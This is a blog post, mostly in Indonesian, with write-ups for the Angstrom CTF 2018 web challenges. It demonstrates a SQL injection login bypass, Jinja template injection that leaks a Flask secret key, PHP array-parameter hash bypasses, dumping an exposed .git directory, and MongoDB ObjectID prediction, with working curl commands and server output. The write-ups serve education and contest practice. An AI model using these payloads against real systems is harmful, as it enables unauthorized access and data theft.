---
private: 'false'
layout: post
featured: false
published: true
comments: true
modified: 2018-03-24
date: 2018-03-24
title: 'Angstrom CTF 2018 : Web Challenges'
tags: [angstromctf]
mathjax: false
imagefeature: 
description: 'Angstrom CTF 2018 : Web Challenges'
category: CTF
chart: null
---


### Source Me 1
---
WEB, 20 pts
There is only one goal: Log in.

Semua informasi yang kita butuhkan untuk login ada pada source htmlnya
jadi kita tinggal login dengan user admin dan password `f7s0jkl`

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Source Me 1</title>
</head>
<body>
<h2>Welcome to the admin portal!</h2>
Currently, only the user who can login is 'admin'.
<br>
<!-- Shh, don't tell anyone. The admin password is f7s0jkl -->
<form action="./login.php" method="get">
Username:<input type="text" name = "user"><br>
Password:<input type="text" name = "pass"><br>
<input type="submit" value="Submit">
</form>
</body>
</html>
```

```
http://web.angstromctf.com:6999/login.php?user=admin&pass=f7s0jkl
Welcome, admin. Here is your flag: actf{source_aint_secure}
```


### GET ME
---
WEB, 30
Get me! Over here.

```html

<!DOCTYPE html>
<html>
<body style="font-size: 18pt; margin: 10% 10% 10% 10%">
  <p>
    Get me! (if you're authorized)
  </p>
  <form method="GET">
    <input type="hidden" name="auth" value="false">
    <input type="submit" value="Submit">
  </form>
</body>
</html>
```

bisa kita lihat disitu ada form dengan method get dan memiliki field auth
dengan value false, ketika kita coba untuk submit form tersebut maka akan di dapatkan output

```
GET => http://web.angstromctf.com:3005/?auth=false
Output => Hey, you're not authorized!

Kita bisa menebak bawha parameter auth adalah boolean yang meiliki false/true
untuk mendapatkan authorisasi kita bisa mengganti false menjadi true

GET => http://web.angstromctf.com:3005/?auth=true
Output => Here you go: actf{why_did_you_get_me}
```


### Sequel
---
WEB, 50
I found what looks like a Star Wars sequel fan club, but I believe the admin user is up to something more nefarious. Can you log in with the admin account and check it out?

Dari nama soalnya yang `Sequel` mungkin memberikan kita clue terhadap SQLInjection
dan memang benar dengan menggunakan payload sederhana seperti `' OR 1=1#` pada field username
dan password kita dapat login dan flag sekaligus :)

```
curl -X POST http://web2.angstromctf.com:2345/ -d "username=' OR 1=1#&password=' OR 1=1#"
<!doctype html>
<html>
        <head>
                <title>Prequel Fan Club</title>
        </head>
        <body style="background-image: url('images/background2.jpeg');">
                <h1 style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 4em; color: red; background-color: yellow; font-
family: sans-serif;">actf{sql_injection_more_like_prequel_injection}</h1>
                <img src="images/anakin.jpg"></img>
                <img src="images/highground.jpg"></img>
                <img src="images/sand.jpg"></img>
                <img src="images/ironic.gif"></img>
                <img style='width: 80%;' src="images/prequels.jpg"></img>
        </body>
</html>#
```


### Source Me 2
WEB, 50
Your goal hasn't changed. Log in.

```html

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Source Me 2</title>
</head>
<body>
<h2>Welcome to the admin portal!</h2>
Currently, only the user who can login is 'admin'.
<br>
Username:<input type="text" id = "uname"><br>
Password:<input type="text" id = "password"><br>
<button onclick="checkLogin()">Log In</button>
<h4 style="color: red;" id="message"></h4>

</body>
<script src="./md5.js"></script>
<script>
    var checkLogin = function () {
        var password = document.getElementById("password").value;
        if (document.getElementById("uname").value != "admin"){
            console.log(uname);
            document.getElementById("message").innerHTML = "Only admin user allowed!";
            return;
        } else {
            var passHash = md5(password);
            if (passHash == "bdc87b9c894da5168059e00ebffb9077"){
                window.location = "./login.php?user=admin&pass=" + password;
            } else {
                document.getElementById("message").innerHTML = "Incorrect Login";
            }
        }
        return;
    }
</script>

</html>
```

Ini adalah lanjutan dari soal source me 1, kali ini dia menggunakan javascript untuk memvalidasi passwordnya
tapi dia menggunakan hash yang mudah dicari di rainbowtable atau dari google 
hash yang di gunakan adalah md5 `bdc87b9c894da5168059e00ebffb9077` plaintextnya adalah `password1234`
```
http://web.angstromctf.com:7000/login.php?user=admin&pass=password1234
Welcome, admin. Here is your flag: actf{md5_hash_browns_and_pasta_sauce}
```


### MadLibs
---
WEB, 120
When Ian was a kid, he loved to play goofy Madlibs all day long. Now, he's decided to write his own website to generate them!

setelah kita melakukan submit ternyata mereka memberikan kita akses source code di `http://web2.angstromctf.com:7777/get-source`
```python
from flask import Flask, render_template, render_template_string, send_from_directory, request
from jinja2 import Environment, FileSystemLoader
from time import gmtime, strftime
template_dir = './templates'
env = Environment(loader=FileSystemLoader(template_dir))


madlib_names = ["The Tale of a Person","A Random Story"]
story_fields = {
    "The Tale of a Person":['Author Name','Adjective','Noun','Verb'],
    "A Random Story":['Author Name','Adjective','Noun','Any first name','Verb']
    }

app = Flask(__name__)
app.secret_key = open("flag.txt").read()

@app.route("/",methods=["GET"])
def home():
    return render_template("home.html",libs=madlib_names)
    
@app.route("/form/<templatename>",methods=["GET"])
def madlib(templatename):
    global madlib_names
    if templatename in madlib_names:  
        return render_template("home.html",libs=madlib_names,title=templatename,fields=story_fields[templatename])
    else:
        error_message = 'The MadLib with title "' + templatename + '" could not be found.'
        return render_template("home.html",libs=madlib_names,message=error_message)

@app.route("/result/<templatename>",methods=["POST"])
def output(templatename):
    
    if templatename not in madlib_names:    
        return "Template not found."
    
    inpValues = []
    for i in range(len(story_fields[templatename])):
        if not request.form[str(i+1)]: 
            return "All form fields must be filled"
        else:
            inpValues.append(request.form[str(i+1)][:24])
        
    authorName = inpValues.pop(0)[:12]
    try:
        comment = render_template_string('''This MadLib with title %s was created by %s at %s''' % (templatename, authorName, strftime("%Y-%m-%d %H:%M:%S", gmtime())))
    except:
        comment = "Error generating comment."
    return render_template("_".join(templatename.lower().split())+".html",libtitle=templatename,footer=comment, libentries=inpValues)
    

@app.route("/get-source", methods=["GET","POST"])
def source():
    return send_from_directory('./','app.py')

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=7777, threaded=True)    
```

terdapat celah template string pada soal ini lebih tepatnya pada kode berikut
```python
comment = render_template_string('''This MadLib with title %s was created by %s at %s''' % (templatename, authorName, strftime("%Y-%m-%d %H:%M:%S", gmtime())))
```

yang bisa kita kontrol adalah `authorName` jadi kita bisa memasukan payload template string kita disitu,
karena flag nya disimpan pada variable environment `app` maka kita bisa menggunakan `{{config}}` untuk memunculkannya


```
curl 'http://web2.angstromctf.com:7777/result/A%20Random%20Story' -H 'Content-Type: application/x-www-form-urlencoded' --data '1=%7B%7Bconfig%7D%7D&2=x&3=x&4=x&5=x' --compressed
<!doctype html>
<title>Angstrom MadLibs</title>

<body>

<h4>A Random Story</h4>

<p>
Once upon a time, there was a very x x named x.
x liked to x.
</p>

<h4>THE END</h4>

This MadLib with title A Random Story was created by &amp;lt;Config {&amp;#39;DEBUG&amp;#39;: False, &amp;#39;TESTING&amp;#39;: False, &amp;#39;PROPAGATE_EXCEPTI
ONS&amp;#39;: None, &amp;#39;PRESERVE_CONTEXT_ON_EXCEPTION&amp;#39;: None, &amp;#39;SECRET_KEY&amp;#39;: &amp;#39;actf{wow_ur_a_jinja_ninja}&amp;#39;, &amp;#39;P
ERMANENT_SESSION_LIFETIME&amp;#39;: datetime.timedelta(31), &amp;#39;USE_X_SENDFILE&amp;#39;: False, &amp;#39;LOGGER_NAME&amp;#39;: &amp;#39;__main__&amp;#39;, &
amp;#39;LOGGER_HANDLER_POLICY&amp;#39;: &amp;#39;always&amp;#39;, &amp;#39;SERVER_NAME&amp;#39;: None, &amp;#39;APPLICATION_ROOT&amp;#39;: None, &amp;#39;SESSION
_COOKIE_NAME&amp;#39;: &amp;#39;session&amp;#39;, &amp;#39;SESSION_COOKIE_DOMAIN&amp;#39;: None, &amp;#39;SESSION_COOKIE_PATH&amp;#39;: None, &amp;#39;SESSION_CO
OKIE_HTTPONLY&amp;#39;: True, &amp;#39;SESSION_COOKIE_SECURE&amp;#39;: False, &amp;#39;SESSION_REFRESH_EACH_REQUEST&amp;#39;: True, &amp;#39;MAX_CONTENT_LENGTH&a
mp;#39;: None, &amp;#39;SEND_FILE_MAX_AGE_DEFAULT&amp;#39;: datetime.timedelta(0, 43200), &amp;#39;TRAP_BAD_REQUEST_ERRORS&amp;#39;: False, &amp;#39;TRAP_HTTP_EX
CEPTIONS&amp;#39;: False, &amp;#39;EXPLAIN_TEMPLATE_LOADING&amp;#39;: False, &amp;#39;PREFERRED_URL_SCHEME&amp;#39;: &amp;#39;http&amp;#39;, &amp;#39;JSON_AS_ASC
II&amp;#39;: True, &amp;#39;JSON_SORT_KEYS&amp;#39;: True, &amp;#39;JSONIFY_PRETTYPRINT_REGULAR&amp;#39;: True, &amp;#39;JSONIFY_MIMETYPE&amp;#39;: &amp;#39;appl
ication/json&amp;#39;, &amp;#39;TEMPLATES_AUTO_RELOAD&amp;#39;: None}&amp;gt; at 2018-03-24 09:23:03
<br><br>
<a href="/">Click here to return to the home page.</a>
<br><br>
MadLib generated using program found <a href="../get-source">here</a>
</body>
</html>
```

untuk lebih jelas tentang template string mungkin bisa baca di sini `https://nvisium.com/resources/blog/2015/12/07/injecting-flask.html`


### MD5
WEB, 140
defund's a true MD5 fan, and he has a site to prove it.

```php
<?php
  include 'secret.php';
  if($_GET["str1"] and $_GET["str2"]) {
    if ($_GET["str1"] !== $_GET["str2"] and
        hash("md5", $salt . $_GET["str1"]) === hash("md5", $salt . $_GET["str2"])) {
      echo $flag;
    } else {
      echo "Sorry, you're wrong.";
    }
    exit();
  }
?>
<!DOCTYPE html>
<html>
<body style="font-size: 18pt; margin: 10% 10% 10% 10%">
  <p>
    People say that MD5 is broken... But they're wrong! All I have to do is use a secret salt. >:)
  </p>
  <p>
    If you can find two distinct strings that—when prepended with my salt—have the same MD5 hash, I'll give you a flag. Deal?
  </p>
  <p>
    Also, here's the <a href="src">source</a>.
  </p>
  <form method="GET">
    String 1: <input type="text" name="str1" style="font-size: 18pt; margin: 10px 10px 10px 10px">
    <br>
    String 2: <input type="text" name="str2" style="font-size: 18pt; margin: 10px 10px 10px 10px">
    <br>
    <input type="submit" style="font-size: 18pt; margin: 10px 0 10px 0">
  </form>
</body>
</html>
```

kita diberikan website yang meminta 2 input string, yang harus mempunyai md5 yang hasilnya jika di bandingkan dengan
`===` sama , dan di sana ada prepend dengan variable $salt yang kita tidak ketahui isinya, jadi attack menggunakan
MD5 Magic hash tidak akan berhasil, untuk yg belum tau apa itu MD5 Magic Hash bisa lihat di `https://www.whitehatsec.com/blog/magic-hashes/`

jadi untuk menyelesaikan soal ini kita bisa merusak batasan validasi yang di buat menggunakan array di parameter input

`if ($_GET["str1"] !== $_GET["str2"] and hash("md5", $salt . $_GET["str1"]) === hash("md5", $salt . $_GET["str2"]))`
jika kita lihat lebih dekat disitu ada 2 validasi, validasi yang pertama adalah str1 !== str2 kemudian validasi ke 2
adalah hash md5 dari $salt+str1  harus sama dengan hash md5 dari $salt+str2
dengan menggunakan array kita hanya membypass untuk validasi yang ke 2, agar validasi yang pertama juga bisa terbypass kita bisa menggunakan huruf yang berbeda,
kurang lebih url akhirnya seperti ini : `http://web.angstromctf.com:3003/?str1[]=a&str2[]=x` untuk mendapatkan flag
`Flag: actf{but_md5_has_charm}`


### FILE STORER
---
WEB, 160
My friend made a file storage website that he says is super secure. Can you prove him wrong and get the admin password?

`Hint: Can't solve it? Git gud.`

so the hint is Git gud, and finally we found .git directory here `http://web2.angstromctf.com:8899/files/.git`
and ue gitdumper to download all the content

```
Sat 16:50:18 with root in /tmp/test 
•% ➜ gitdumper.sh http://web2.angstromctf.com:8899/files/.git/ .

###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances.
# Only for educational purposes!
###########

[*] Destination folder does not exist
[+] Creating ./.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[+] Downloaded: objects/12/33bdadb67c905af6516a2e1b94ebf32a0a2f61
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/55/28cb84ba39060910e309688e2b340084623899
[+] Downloaded: objects/aa/168eed25aa55fff21054a858329cb4e1187ff0
[+] Downloaded: objects/b8/e1848501840d89d32c3f8eadfafe38a78f8203
[+] Downloaded: objects/63/9c13293220ac138c16cddfa9bea84d16e0d1a7
[+] Downloaded: objects/43/31a907733114461f8ce52a3076c48ac26c00c2
[+] Downloaded: objects/29/fff8b2c54b09cf0318dde83d1bcbdc1d6d22e8

```

Setelah kita dump folder .git nya kita bisa checkout ke commit terakhirnya, tapi commit terakhirnya malah semua file sudah di delete
jadi kita harus `git checkout --hard` untuk kembali ke commit sebelumnya

```
Sat 16:57:09 with root in /tmp/test on  1233bda [✘] 
•% ➜ git reset --hard
HEAD is now at 1233bda first commit
```

kita dapat file sourcecode index.py nya

```python
from flask import Flask, request, render_template, abort
import os, requests

app = Flask(__name__)

class user:
    def __init__(self, username, password):
        self.username = username
        self.__password = password
        self.files = []
    def getPass(self):
        return self.__password

users = {}
users["admin"] = user("admin", os.environ["FLAG"])

@app.errorhandler(500)
def custom500(error):
    return str(error), 500

@app.route("/", methods=["GET", "POST"])
def mainpage():
    if request.method == "POST":
        if request.form["action"] == "Login":
            if request.form["username"] in users:
                if request.form["password"] == users[request.form["username"]].getPass():
                    return render_template("index.html", user=users[request.form["username"]])
                return "wrong password"
            return "user does not exist"
        elif request.form["action"] == "Signup":
            if request.form["username"] not in users:
                users[request.form["username"]] = user(request.form["username"], request.form["password"])
                return render_template("index.html", user=users[request.form["username"]])
            else:
                return "user already exists"
        elif request.form["action"] == "Add File":
            return addfile()
    return render_template("loggedout.html")

#beta feature for viewing info about other users - still testing
@app.route("/user/<username>", methods=['POST'])
def getInfo(username):
    val = getattr(users[username], request.form['field'], None)
    if val != None: return val
    else: return "error"

@app.route("/files/<path:file>", methods=["GET"])
def getFile(file):
    if "index.py" in file:
        return "no! bad user! bad!"
    return open(file, "rb").read()

def addfile():
    if users[request.form["username"]].getPass() == request.form["password"]:
        if request.form['url'][-1] == "/": downloadurl = request.form['url'][:-1]
        else: downloadurl = request.form['url']
        if downloadurl.split("/")[-1] in os.listdir("."):
            return "file already exists"
        file = requests.get(downloadurl, stream=True)
        f = open(downloadurl.split("/")[-1], "wb")
        first = True
        for chunk in file.iter_content(chunk_size=1024*512):
            if not first: break
            f.write(chunk)
            first = False
        f.close()
        users[request.form["username"]].files.append(downloadurl.split("/")[-1])
        return render_template("index.html", user=users[request.form["username"]])
    return "bad password"

if __name__ == "__main__": app.run(host="0.0.0.0")
```

yang menarik adalah fungsi berikut
```python
#beta feature for viewing info about other users - still testing
@app.route("/user/<username>", methods=['POST'])
def getInfo(username):
    val = getattr(users[username], request.form['field'], None)
    if val != None: return val
    else: return "error"
```
kita bisa menampilkan atribut yg kita mau dari user yang kita tentukan di url
contohnya untuk mendapatkan username dari admin kita bisa lakukan posts request berikut

```
Sat 17:02:01 with root in /tmp/test on  1233bda 
•% ➜ curl -X POST http://web2.angstromctf.com:8899/user/admin -d "field=username"
admin#
```

```python
class user:
    def __init__(self, username, password):
        self.username = username
        self.__password = password
        self.files = []
    def getPass(self):
        return self.__password

users = {}
users["admin"] = user("admin", os.environ["FLAG"])
```

pada baris kode ini kita bisa lihat flag yang di ambil dari environment di masukan sebagai password dari user admin
berarti untuk mendapatkan flag kita harus bisa mendapatkan password dari admin yg mana adalah flag :D
variable untuk password adalah `__password` tapi untuk memunculkan password kita tidak bisa langsung memanggil field `__password` 
karena double underscore pada variable disini memiliki arti (_classname__attributename) sebutannya adalah (Name Mangling)

```
Any identifier of the form __spam (at least two leading underscores, 
at most one trailing underscore) is textually replaced with 
_classname__spam, where classname is the current class name
with leading underscore(s) stripped. This mangling is done 
without regard to the syntactic position of the identifier, 
so it can be used to define class-private instance and class
 variables, methods, variables stored in globals, and even 
 variables stored in instances. private to this class on 
 instances of other classes.
```

```
Sat 17:02:01 with root in /tmp/test on  1233bda 
•% ➜ curl -X POST http://web2.angstromctf.com:8899/user/admin -d "field=_user__password"
actf{2_und3rsc0res_h1des_n0th1ng}#
```

untuk lebih legkap tentang underscore pada python bisa lihat di `https://shahriar.svbtle.com/underscores-in-python`


### THE BEST WEBSITE
---
WEB, 230
I have created what I believe to be the best website ever. Or maybe it's just really boring. I don't know.
`Hint: My database is humongous!` => MongoDB ?


`<!--developers: make sure to record your actions in log.txt-->` => `http://web.angstromctf.com:7667/log.txt`

pada file log.txt terlihat log pada perubahan yang di lakukan oleh developer dengan detail datetimenya
```
Sat Aug 10 2017 10:23:17 GMT-0400 (EDT) - Initial website
Sat Aug 10 2017 14:54:07 GMT-0400 (EDT) - Database integration
Sat Aug 11 2017 14:08:54 GMT-0400 (EDT) - Make some changes to the text
Sat Mar 17 2018 16:24:17 GMT+0000 (UTC) - Add super secret flag to database
```
kemudian pada file `http://web.angstromctf.com:7667/js/init.js` ada endpoint boxes yang di fetch datanya menggunakan ajax

```javascript
ids = ["5aad412be07e1e001cfce6d2","5aad412be07e1e001cfce6d3","5aad412be07e1e001cfce6d4"];
	$(function() {

		$.ajax({
			url: "/boxes?ids="+ids.join(","),
			success: function(data) {
				data = JSON.parse(data)
				$("#box1_title").text(data.boxes[0].data.split("^")[0])
				$("#box1_caption").text(data.boxes[0].data.split("^")[1])
				$("#box2_title").text(data.boxes[1].data.split("^")[0])
				$("#box2_caption").text(data.boxes[1].data.split("^")[1])
				$("#box3_title").text(data.boxes[2].data.split("^")[0])
				$("#box3_caption").text(data.boxes[2].data.split("^")[1])
			}
		})

	});
```

berdasarkan cluenya database menggunakan mongodb ternyata benar karena id yang digunakan sangat mirip dengan yang di gunakan pada mongodb
`https://docs.mongodb.com/manual/reference/method/ObjectId/#ObjectIDs-BSONObjectIDSpecification` pada file log.txt yang mengatakan bahwa flag sudah ditambahkan ke database
berarti kita bisa memunculkan flagnya dengan memasukan id flag pada endpoint boxes. pertama kita harus mengkonstruksi id dari flag yang di simpan

```
ObjectID MongoDB
a 4-byte value representing the seconds since the Unix epoch,
a 3-byte machine identifier,
a 2-byte process id, and
a 3-byte counter, starting with a random value.
```
Object id yang di gunakan mongoDB mempunyai struktur diatas 4-byte
pertama adalah hexadecimal dari unix epoch time, kita bisa dapatkan waktunya
dari file log.txt `Sat Mar 17 2018 16:24:17 GMT+0000 (UTC)` mengkonversi kan ke epoch dan kemudian
kedalam hexadecimal `5aad4131` kemudian machine identifier dan proccess id bisa di ambil dari id yang ada di script init.js `e07e1e` and proccess id `001c`
dan last counter dari id yang ada adalah `fce6d4` jadi kita gunakan lastcounter+1 `fce6d5`
```
ID= [4-Byte Hex representing unix epoch time]+[3-Byte Machine identifier]+[2-Byte Proccess Id]+[3-Byte Counter]
Flag ID = 5aad4131e07e1e001cfce6d5

Get => http://web.angstromctf.com:7667/boxes?ids=5aad412be07e1e001cfce6d2,5aad412be07e1e001cfce6d3,5aad4131e07e1e001cfce6d5
Output => 
{
  boxes: [
  {
      _id: "5aad412be07e1e001cfce6d2",
      data: "Go away.^This website has literally nothing of interest. You might as well leave.",
      __v: 0
  },
  {
      _id: "5aad412be07e1e001cfce6d3",
      data: "You will be very bored.^Seriously, there's nothing interesting.",
      __v: 0
  },
  {
      _id: "5aad4131e07e1e001cfce6d5",
      data: "actf{0bj3ct_ids_ar3nt_s3cr3ts}",
      __v: 0
  }
  ]
}
 
```

**Flag: actf{0bj3ct_ids_ar3nt_s3cr3ts}**




